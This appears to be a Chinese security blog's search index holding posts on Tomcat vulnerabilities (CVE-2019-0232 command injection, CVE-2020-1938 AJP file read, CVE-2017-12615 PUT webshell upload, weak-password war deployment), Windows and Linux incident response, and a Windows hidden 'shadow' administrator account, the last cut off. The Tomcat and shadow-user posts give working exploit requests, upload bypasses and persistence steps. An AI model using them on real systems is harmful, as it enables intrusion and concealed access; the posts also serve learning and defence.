<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>中间件漏洞Tomcat篇(2)</title>
      <link href="/2023/07/21/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/"/>
      <url>/2023/07/21/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/</url>
      
        <content type="html"><![CDATA[<h2 id="3-远程代码执行（CVE-2019-0232）"><a href="#3-远程代码执行（CVE-2019-0232）" class="headerlink" title="3.远程代码执行（CVE-2019-0232）"></a>3.远程代码执行（CVE-2019-0232）</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Tomcat是美国阿帕奇（Apache）软件基金会的一款轻量级Web应用服务器。该程序实现了对 Servlet和JavaServer Page（JSP）的支持。 4月11日，Apache官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由 于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。 </p><pre class=" language-shell"><code class="language-shell">触发该漏洞需要同时满足以下条件： 1. 系统为Windows 2. 启用了CGI Servlet（默认为关闭） 3. 启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</code></pre><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>漏洞相关的代码在 <code>tomcat\java\org\apache\catalina\servlets\CGIServlet.java</code> 中，<code>CGIServlet</code>提供了一个<code>cgi</code>的调用接口，在启用 <code>enableCmdLineArguments</code> 参数时，会根据<code>RFC 3875</code>来从Url参数中生成命令行参数，并把参数传递至Java的<code>Runtime</code>执行。这个漏洞是因为<code>Runtime.getRuntime().exec</code>在Windows中和Linux中底层实现不同导致的。</p><p>Java的 <code>Runtime.getRuntime().exec</code> 在<code>CGI</code>调用这种情况下很难有命令注入。而Windows中创建进程使用的是 <code>CreateProcess</code> ，会将参数合并成字符串，作为 <code>lpComandLine</code> 传入 <code>CreateProcess</code> 。程序启动后调用 <code>GetCommandLine</code> 获取参数，并调用 <code>CommandLineToArgvW</code> 传至 argv。在Windows中，当 <code>CreateProcess</code> 中的参数为 bat 文件或是 cmd 文件时，会调用 <code>cmd.exe</code> , 故最后会变成 <code>cmd.exe /c "arg.bat &amp; dir"</code>，而Java的调用过程并没有做任何的转义，所以在Windows下会存在漏洞。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><pre class=" language-shell"><code class="language-shell">Apache Tomcat 9.0.0.M1 to 9.0.17Apache Tomcat 8.5.0 to 8.5.39Apache Tomcat 7.0.0 to 7.0.93</code></pre><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>Tomcat的CGI_Servlet组件默认是关闭的，在 conf/web.xml 中找到注释的CGIServlet部分，去掉注释， 并配置enableCmdLineArguments和executable</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/1.png"></p><p> 然后在<code>conf/web.xml</code>中启用<code>cgi</code>的 <code>servlet-mapping</code>（去掉注释）</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/2.png"></p><p>修改<code>conf/context.xml</code>，添加 <code>privileged="true"</code>属性，否则会没有权限</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/3.png"></p><p>在<code>webapps\ROOT\WEB-INF</code>下创建<code>cgi-bin</code>目录，并在该目录下创建一个test.bat，test.bat中写入如下内容，重启tomcat。</p><pre class=" language-bash"><code class="language-bash">@echo off<span class="token keyword">echo</span> Content-Type: text/plainecho.<span class="token keyword">set</span> off<span class="token operator">=</span>%~1%off%</code></pre><p>接着访问<code>http://192.168.3.208:8080/cgi-bin/test.bat?&amp;C%3A%5CWindows%5CSystem32%5Cnet%20user</code>即可执行<code>net user</code>命令</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/4.png"></p><p>我们也可以访问<code>http://192.168.3.208:8080/cgi-bin/test.bat?&amp;C%3A%5CWindows%5CSystem32%5Csysteminfo</code>执行<code>systeminfo</code>命令，只要修改后面参数即可进行任意命令执行</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/5.png"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>及时进行版本更新</p><h2 id="4-Apache-Tomcat文件包含漏洞（CVE-2020-1938）"><a href="#4-Apache-Tomcat文件包含漏洞（CVE-2020-1938）" class="headerlink" title="4.Apache Tomcat文件包含漏洞（CVE-2020-1938）"></a>4.Apache Tomcat文件包含漏洞（CVE-2020-1938）</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Tomcat默认开启的AJP服务（8009端口）存在一处文件包含缺陷，攻击者可构造恶意的请求包进行文件包含操作，进而读取受影响Tomcat服务器上的Web目录文件。通常用java开发的应用程序的war包也是放在webapp目录下的，所以也能够被攻击者读取到。这也意味着，如果你把数据库用户名密码、连接其他后端服务的账号、JWT签名secret、OAuth AppSecret等密钥信息放在properties文件里的话，那么，攻击者可能现在也拿到了这些信息，并且正在试着入侵你的服务器。</p><h3 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h3><pre class=" language-sh"><code class="language-sh">Apache Tomcat 6Tomcat 7系列 <7.0.100Tomcat 8系列 < 8.5.51Tomcat 9 系列 <9.0.31</code></pre><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>tomcat默认的<code>conf/server.xml</code>中配置了2个Connector，一个为8080的对外提供的HTTP协议端口，另 外一个就是默认的8009AJP协议端口，两个端口默认均监听在外网ip。tomcat在接收AJP请求的时候调用<code>org.apache.coyote.ajp.AjpProcessor</code>来处理AJP消息， prepareRequest将AJP里面的内容取出来设置成request对象的Attribute属性。可以通过此种特性从而 可以控制request对象的下面三个Attribute属性</p><pre class=" language-sh"><code class="language-sh">javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path</code></pre><p>再通过控制AJP控制的上述三个属性来读取文件，通过操控上述三个属性从而可以读取到应用目录下的任何文件。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>1.利用nmap进行扫描探测是否开启AJP服务的8009端口</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/6.png"></p><p>2.利用POC直接验证</p><p>工具地址：<a href="https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi">https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi</a></p><pre class=" language-shell"><code class="language-shell">使用命令：python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py [IP] -p 8009 -f WEB-INF/web.xml</code></pre><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-2/7.png"></p><p>成功读取到web.xml文件</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.更新到安全版本</p><p>2.关闭AJP服务，修改Tomcat配置文件Service.xml,注释掉</p><pre class=" language-shell"><code class="language-shell"><Connector port="8009" protocol="AJP/1.3" redirectPort="8443" /></code></pre><p>3.配置AJP配置中的secretRequired跟secret属性来限制认证</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
            <tag> Tomcat漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中间件漏洞Tomcat篇(1)</title>
      <link href="/2023/07/21/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/"/>
      <url>/2023/07/21/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-Tomcat-远程代码执行漏洞（CVE-2017-12615）"><a href="#1-Tomcat-远程代码执行漏洞（CVE-2017-12615）" class="headerlink" title="1.Tomcat 远程代码执行漏洞（CVE-2017-12615）"></a>1.Tomcat 远程代码执行漏洞（CVE-2017-12615）</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者可能通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。漏洞的产生是由于配置不当（非默认配置），将配置文件（conf/web.xml）中的 readonly 设置为了 false ，导致可以使用PUT方法上传任意文件 ，虽然限制了jsp后缀，不过对于不同平台有多种绕过方法 。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>当在Tomcat的conf/web.xml配置文件中添加readonly设置为false时，将导致该漏洞产生。构造PUT请求包绕过对于jsp后缀的限制即可上传木马。</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/1.png"></p><p><strong>绕过jsp限制方式</strong></p><pre class=" language-sh"><code class="language-sh">PUT /shell.jsp/#加/PUT /shell.jsp%20#加%20PUT /shell.jsp::$DATA#加::$DATA</code></pre><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p> Apache Tomcat 7.0.0 - 7.0.79  </p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>抓包修改请求并上传马子</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/2.png"></p><p>利用shell工具进行连接</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/3.png"></p><p>成功上传木马，getshell</p><h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>将readonly的值设置为true</p><h2 id="2-弱口令爆破-上传war包"><a href="#2-弱口令爆破-上传war包" class="headerlink" title="2.弱口令爆破&amp;上传war包"></a>2.弱口令爆破&amp;上传war包</h2><h3 id="漏洞描述-1"><a href="#漏洞描述-1" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Tomcat有一个管理后台，其用户名和密码在Tomcat安装目录下的conf/tomcat-users.xml文件中配置，不少管理员为了方便，经常采用弱口令。 Tomcat 支持在后台部署war包，可以直接将webshell部署到web目录下，如果tomcat后台管理用户存在弱口令，这很容易被利用上传webshell。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.抓包获取Tomcat控制台的账户密码形式。在Authorization报文段中存放着认证数据，且经过Base64加密，我们将其解密发现认证数据传输方式为<code>账户:密码</code></p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/4.png"></p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/5.png"></p><p>2.利用burp的Intruder模块进行爆破。选择自定义迭代器，将形式设置为<code>账户:密码</code>，并最后进行Base64编码（不要勾选url-encode）</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/6.png"></p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/7.png"></p><p>3.将爆破成功的结果进行Base64解码即可获得最终账户密码</p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/8.png"></p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/9.png"></p><p>最终的账户为tomcat，密码也为tomcat</p><p>4.登陆后台，上传war包</p><p><strong>制作war包</strong></p><p>①将冰蝎的jsp马子压缩成shell.zip</p><p>②再将shell.zip改名为shell.war</p><pre class=" language-shell"><code class="language-shell">注意：上传的war包会创建一个文件名目录，并在该目录下解压比如上传shell.war，tomcat会在webapps目录下创建一个shell目录，并在其中解压shell.war，也就是说shell.jsp的路径为：../shell/shell.jsp</code></pre><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/10.png"></p><p><img src="/../images/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9ETomcat%E7%AF%87-1/11.png"></p><h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>1.将弱口令改为强口令（conf/tomcat-users.xml）</p><p>2.删除manager文件</p>]]></content>
      
      
      <categories>
          
          <category> 中间件漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 中间件漏洞 </tag>
            
            <tag> Tomcat漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows应急响应</title>
      <link href="/2023/07/19/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2023/07/19/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="1-用户排查"><a href="#1-用户排查" class="headerlink" title="1.用户排查"></a>1.用户排查</h1><h2 id="查看本地用户和组"><a href="#查看本地用户和组" class="headerlink" title="查看本地用户和组"></a>查看本地用户和组</h2><pre class=" language-sh"><code class="language-sh">win + r 输入 lusrmgr.msc 查看本地用户和组中是否有可疑用户</code></pre><h2 id="查看注册表"><a href="#查看注册表" class="headerlink" title="查看注册表"></a>查看注册表</h2><pre class=" language-sh"><code class="language-sh">win + r 输入 regeditHKLM\SAM\SAM\Domains\Account\Users\Names 查看是否有可疑用户ps:记得赋予Administrator对应SAM的完全控制</code></pre><p><img src="/../images/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.png"></p><h2 id="利用Wmic命令"><a href="#利用Wmic命令" class="headerlink" title="利用Wmic命令"></a>利用Wmic命令</h2><pre class=" language-sh"><code class="language-sh">在cmd中输入：wmic useraccount get name,sid</code></pre><p><img src="/../images/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/2.png"><br>特别关注带有$的隐藏用户</p><hr><h1 id="2-启动项排查"><a href="#2-启动项排查" class="headerlink" title="2. 启动项排查"></a>2. 启动项排查</h1><h2 id="启动菜单查看"><a href="#启动菜单查看" class="headerlink" title="启动菜单查看"></a>启动菜单查看</h2><pre class=" language-sh"><code class="language-sh">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><h2 id="系统配置msconfig"><a href="#系统配置msconfig" class="headerlink" title="系统配置msconfig"></a>系统配置msconfig</h2><pre class=" language-sh"><code class="language-sh">win + r 输入 msconfig ---> 点击启动 查看可疑启动项</code></pre><h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><pre class=" language-sh"><code class="language-sh">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceHKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code></pre><h1 id="3-计划任务排查"><a href="#3-计划任务排查" class="headerlink" title="3. 计划任务排查"></a>3. 计划任务排查</h1><h2 id="利用计算机管理"><a href="#利用计算机管理" class="headerlink" title="利用计算机管理"></a>利用计算机管理</h2><pre class=" language-sh"><code class="language-sh">win + r 输入 compmgmt.msc ---> 任务计划程序 ---> 任务计划程序库 查找可疑计划任务</code></pre><p><img src="/../images/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/3.png"></p><h2 id="命令行查看计划任务"><a href="#命令行查看计划任务" class="headerlink" title="命令行查看计划任务"></a>命令行查看计划任务</h2><pre class=" language-sh"><code class="language-sh">cmd 中 输入：schtasks</code></pre><h1 id="4-服务自启动排查"><a href="#4-服务自启动排查" class="headerlink" title="4. 服务自启动排查"></a>4. 服务自启动排查</h1><pre class=" language-sh"><code class="language-sh">win + r 输入 services.msc    注意服务状态和启动类型，检查是否有异常服务</code></pre><h1 id="5-临时目录排查"><a href="#5-临时目录排查" class="headerlink" title="5. 临时目录排查"></a>5. 临时目录排查</h1><pre class=" language-sh"><code class="language-sh">C:\Windows\Temp%Temp%在目录中发现可疑的pe文件即可丢入查杀平台进行验证，若是木马文件即需要即使取样并清除</code></pre><h1 id="6-最近操作排查"><a href="#6-最近操作排查" class="headerlink" title="6. 最近操作排查"></a>6. 最近操作排查</h1><pre class=" language-sh"><code class="language-sh">win + r 输入 recent时间排序，查看是否有可疑⽂件</code></pre><h1 id="7-进程排查"><a href="#7-进程排查" class="headerlink" title="7. 进程排查"></a>7. 进程排查</h1><h2 id="查看可疑网络连接"><a href="#查看可疑网络连接" class="headerlink" title="查看可疑网络连接"></a>查看可疑网络连接</h2><pre class=" language-sh"><code class="language-sh">netstat -ano | findstr "ESTABLISHED"</code></pre><h2 id="根据可疑连接pid定位"><a href="#根据可疑连接pid定位" class="headerlink" title="根据可疑连接pid定位"></a>根据可疑连接pid定位</h2><pre class=" language-sh"><code class="language-sh">tasklist | findstr "pid"</code></pre><h2 id="杀掉进程"><a href="#杀掉进程" class="headerlink" title="杀掉进程"></a>杀掉进程</h2><pre class=" language-sh"><code class="language-sh">taskkill /F /T /PID [pid]/F：强制终止/T：终止该进程以及其子进程/PID：后接进程pid值</code></pre><h2 id="利用msinfo32排查进程"><a href="#利用msinfo32排查进程" class="headerlink" title="利用msinfo32排查进程"></a>利用msinfo32排查进程</h2><pre class=" language-sh"><code class="language-sh">win + r 输入 msinfo32 ---> 软件环境 ---> 正在运行任务 即可查看正在运行进程详细信息</code></pre><p><img src="/../images/Windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/4.png"></p><h1 id="8-补丁排查"><a href="#8-补丁排查" class="headerlink" title="8. 补丁排查"></a>8. 补丁排查</h1><pre class=" language-sh"><code class="language-sh">systeminfo 查看主机补丁情况，将其复制到在线Windows提权网站即可看到缺失补丁信息</code></pre><h1 id="9-日志排查"><a href="#9-日志排查" class="headerlink" title="9. 日志排查"></a>9. 日志排查</h1><h2 id="查看日志"><a href="#查看日志" class="headerlink" title="查看日志"></a>查看日志</h2><pre class=" language-sh"><code class="language-sh">win + r 输入 eventvwr.msc 打开事件检查器日志路径：C:\Windows\System32\winevt\Logs</code></pre><h2 id="重点排查事件"><a href="#重点排查事件" class="headerlink" title="重点排查事件"></a>重点排查事件</h2><pre class=" language-sh"><code class="language-sh">4624（登陆成功）4625（登陆失败）关注调用进程名，登录源ip，登录源端口，登陆用户名和登陆失败信息等4720（创建用户）4726（删除用户）</code></pre>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 蓝队 </tag>
            
            <tag> Windows应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/2023/07/19/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"/>
      <url>/2023/07/19/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
      
        <content type="html"><![CDATA[<h1 id="1-排查开机启动项"><a href="#1-排查开机启动项" class="headerlink" title="1.排查开机启动项"></a>1.排查开机启动项</h1><h2 id="相关文件及目录"><a href="#相关文件及目录" class="headerlink" title="相关文件及目录"></a>相关文件及目录</h2><pre class=" language-sh"><code class="language-sh">文件/etc/rc.local/etc/rc.d/rc.local文件夹/etc/rc.d/init.d                #该目录存放了可执行的脚本或文件/etc/rc*.d</code></pre><h2 id="相关指令"><a href="#相关指令" class="headerlink" title="相关指令"></a>相关指令</h2><p>查看开机启动服务</p><pre class=" language-sh"><code class="language-sh">systemctl list-unit-files | grep enable</code></pre><p>关闭恶意服务</p><pre class=" language-sh"><code class="language-sh">sudo systemctl stop [恶意服务]</code></pre><p>删除恶意服务开机启动</p><pre class=" language-sh"><code class="language-sh">sudo systemctl disable [恶意服务]</code></pre><p>关闭错误时还原服务设置</p><pre class=" language-sh"><code class="language-sh">sudo systemctl start [客户服务]sudo systemctl enable [客户服务]</code></pre><hr><h1 id="2-排查系统配置文件"><a href="#2-排查系统配置文件" class="headerlink" title="2.排查系统配置文件"></a>2.排查系统配置文件</h1><h2 id="环境变量配置文件"><a href="#环境变量配置文件" class="headerlink" title="环境变量配置文件"></a>环境变量配置文件</h2><ul><li><p>/etc/profile</p></li><li><p>/etc/bashrc</p></li><li><p>/etc/bash.bashrc</p></li><li><p>~/.bashrc</p></li><li><p>~/.profile</p></li><li><p>~/.bash_profile</p></li><li><p>~/.bash_logout</p><p><img src="/../images/Linux%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1.png"></p><p>登录和切换用户时都会加载这些环境变量文件，而在系统登出时则会加载~/.bash_logout/</p></li></ul><hr><h1 id="3-排查资源异常以及进程"><a href="#3-排查资源异常以及进程" class="headerlink" title="3.排查资源异常以及进程"></a>3.排查资源异常以及进程</h1><h2 id="查看所有进程"><a href="#查看所有进程" class="headerlink" title="查看所有进程"></a>查看所有进程</h2><pre class=" language-sh"><code class="language-sh">sudo ps -aux</code></pre><h2 id="查找进程文件位置"><a href="#查找进程文件位置" class="headerlink" title="查找进程文件位置"></a>查找进程文件位置</h2><pre class=" language-sh"><code class="language-sh">sudo lsof -p [PID]                #查看该pid对应进程的详细信息sudo ls -al /proc/pid/exe         #查看该pid对应进程的绝对路径sudo kill -9 [PID]                #杀掉进程</code></pre><table><thead><tr><th align="left">文件</th><th align="left">作用</th></tr></thead><tbody><tr><td align="left">cwd</td><td align="left">符号链接的是进程运行目录</td></tr><tr><td align="left">exe</td><td align="left">符号链接的是执行程序的绝对路径</td></tr><tr><td align="left">cmdline</td><td align="left">符号链接的是进程运行目录</td></tr><tr><td align="left">environ</td><td align="left">记录进程运行时系统的环境变量</td></tr></tbody></table><h2 id="查看CPU占用"><a href="#查看CPU占用" class="headerlink" title="查看CPU占用"></a>查看CPU占用</h2><pre class=" language-sh"><code class="language-sh">top</code></pre><h2 id="查看内存"><a href="#查看内存" class="headerlink" title="查看内存"></a>查看内存</h2><pre class=" language-sh"><code class="language-sh">ps -aux | sort -k4nr | head -10</code></pre><hr><h1 id="4-网络排查"><a href="#4-网络排查" class="headerlink" title="4.网络排查"></a>4.网络排查</h1><h2 id="网卡实时流量排查"><a href="#网卡实时流量排查" class="headerlink" title="网卡实时流量排查"></a>网卡实时流量排查</h2><pre class=" language-sh"><code class="language-sh">sudo iftop -i [网卡] -P</code></pre><h2 id="网络连接排查"><a href="#网络连接排查" class="headerlink" title="网络连接排查"></a>网络连接排查</h2><pre class=" language-sh"><code class="language-sh">netstat -antup</code></pre><ul><li>-a 显示所有</li><li>-n 数字形式展示连接端口</li><li>-t 查看tcp连接</li><li>-u 查看udp连接</li><li>-p 显示相关程序名<br>着重查看ESTABLISHED的端口</li></ul><hr><h1 id="5-定时任务排查"><a href="#5-定时任务排查" class="headerlink" title="5.定时任务排查"></a>5.定时任务排查</h1><h2 id="定时任务文件或目录"><a href="#定时任务文件或目录" class="headerlink" title="定时任务文件或目录"></a>定时任务文件或目录</h2><ul><li>/var/spool/cron                                                          </li><li>/etc/crontab                                                            </li><li>/etc/cron.d</li><li>/etc/cron.hourly</li><li>/etc/cron.daily</li><li>/etc/cron.weekly</li><li>/etc/cron.monthly</li></ul><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h2><pre class=" language-sh"><code class="language-sh">crontab -l                             #查看所有crontab计划任务</code></pre><hr><h1 id="6-用户筛查"><a href="#6-用户筛查" class="headerlink" title="6.用户筛查"></a>6.用户筛查</h1><p>检查用户的uid和gid，如果为0着重注意</p><pre class=" language-sh"><code class="language-sh">/etc/passwd</code></pre><p>查看登录用户的时间、ip</p><pre class=" language-sh"><code class="language-sh">who</code></pre><hr><h1 id="7-Rootkit排查"><a href="#7-Rootkit排查" class="headerlink" title="7.Rootkit排查"></a>7.Rootkit排查</h1><h2 id="chkrootkit"><a href="#chkrootkit" class="headerlink" title="chkrootkit"></a>chkrootkit</h2><pre class=" language-sh"><code class="language-sh">sudo apt install chkrootkitsudo chkrootkit</code></pre><h2 id="rkhunter"><a href="#rkhunter" class="headerlink" title="rkhunter"></a>rkhunter</h2><pre class=" language-sh"><code class="language-sh">sudo apt install rkhuntersudo rkhunter --check</code></pre>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux应急响应 </tag>
            
            <tag> 蓝队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows建立影子用户</title>
      <link href="/2023/07/15/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/"/>
      <url>/2023/07/15/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>我们在管理员权限下可以使用<code>net user [username$] [password] /add</code>命令来创建或者删除隐藏用户，因此我们可以利用此方法建立隐藏用户来实现权限维持。但是通过这种方式建立的隐藏用户虽然能逃过<code>net user</code>的检查，在本地用户和组中暴露无遗。为了更好的建立隐藏用户，我们需要修改注册表相关内容。</p><h1 id="创建过程"><a href="#创建过程" class="headerlink" title="创建过程"></a>创建过程</h1><h2 id="1-创建常规隐藏用户并提升权限"><a href="#1-创建常规隐藏用户并提升权限" class="headerlink" title="1.创建常规隐藏用户并提升权限"></a>1.创建常规隐藏用户并提升权限</h2><p>创建隐藏用户<code>test$</code>，并将密码设置为123</p><pre class=" language-powershell"><code class="language-powershell">net user test$ 123 <span class="token operator">/</span>add</code></pre><p>将test$用户加入高权限的管理员组</p><pre class=" language-powershell"><code class="language-powershell">net localgroup administrators test$ <span class="token operator">/</span>add</code></pre><p>将test$用户退出低权限的用户组</p><pre class=" language-powershell"><code class="language-powershell">net localgroup users test$ <span class="token operator">/</span><span class="token function">del</span></code></pre><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/1.png"></p><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/2.png"></p><p>很清楚地看见<code>net user</code>无法检测我们刚刚生成的隐藏用户，但是本地用户和组中能看见</p><h2 id="2-修改注册表"><a href="#2-修改注册表" class="headerlink" title="2.修改注册表"></a>2.修改注册表</h2><h3 id="修改注册表SAM的权限"><a href="#修改注册表SAM的权限" class="headerlink" title="修改注册表SAM的权限"></a>修改注册表SAM的权限</h3><p>将<code>SAM</code>的<code>Administrators</code>组权限设置为完全控制，重新打开注册表（或者按F5刷新）即可看见<code>SAM</code>下面的项</p><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/3.png"></p><h3 id="替换隐藏用户属性为管理员"><a href="#替换隐藏用户属性为管理员" class="headerlink" title="替换隐藏用户属性为管理员"></a>替换隐藏用户属性为管理员</h3><p>首先在<code>Names</code>项中将事先添加的隐藏用户<code>test$</code>导出保存为<code>1.reg</code></p><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/4.png"></p><p>再通过<code>Names</code>项中用户的值去将<code>Users</code>项中<code>test$</code>和管理员用户<code>Administrator</code>注册表进行导出（比如<code>test$</code>的值为<code>0x3ec</code>，我们将<code>USers</code>项中的<code>000003EC</code>导出）</p><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/5.png"></p><p>将<code>000003EC</code>保存为<code>2.reg</code></p><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/6.png"></p><p>将<code>Administrator</code>对应的<code>000001F4</code>保存为<code>admin.reg</code></p><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/7.png"></p><p>将<code>2.reg</code>中<code>F</code>的值替换为<code>admin.reg</code>中<code>F</code>的值（将黄色部分替换为红色部分）</p><p><img src="/../images/Windows%E5%BB%BA%E7%AB%8B%E5%BD%B1%E5%AD%90%E7%94%A8%E6%88%B7/8.png"></p><h3 id="删除隐藏用户，导入隐藏用户注册表"><a 